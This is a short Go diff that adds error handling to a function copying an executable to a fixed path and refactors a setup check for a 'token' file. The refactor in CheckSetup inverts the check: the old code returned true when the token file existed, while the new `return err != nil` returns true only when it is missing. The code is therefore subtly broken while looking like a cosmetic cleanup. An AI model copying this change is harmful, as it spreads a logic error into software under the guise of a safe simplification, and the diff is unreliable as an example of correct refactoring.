@@ -22,7 +22,10 @@ func copyExecuteable() error {
 	if err != nil {
 		return err
 	}
-	os.MkdirAll(Path, os.ModePerm)
+	err = os.MkdirAll(Path, os.ModePerm)
+	if err != nil {
+		return err
+	}
 	return ioutil.WriteFile(PathExe, data, os.ModePerm)
 }
 
@@ -42,10 +45,7 @@ func CheckSetup() bool {
 	osexe, _ := os.Executable()
 	if osexe == PathExe {
 		_, err := os.Stat(filepath.Join(Path, "token"))
-		if err != nil {
-			return false
-		}
-		return true
+		return err != nil
 	}
 	return false
 }
